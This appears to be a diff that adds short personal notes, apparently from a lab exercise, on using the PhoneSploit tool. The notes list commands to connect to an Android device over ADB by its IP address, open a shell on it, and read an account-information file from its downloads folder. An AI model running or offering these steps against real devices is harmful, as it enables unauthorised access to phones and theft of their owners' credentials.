@@ -1,0 +1,17 @@
+PhoneSploit
+https://n00bie.medium.com/hacking-android-using-phonesploit-ffbb2a899e6
+
+apt-get install adb
+git clone github.com/01010000/phonesploit
+cd phonesploit
+pyhton3 phonesploit.py
+3 (Connect to new phone)
+Add IP address of android device
+4 (Access shell on phone)
+IP address again of android device
+pwd
+ls
+cd sdcard
+ls
+cd downloads
+cat accnt-info.txt
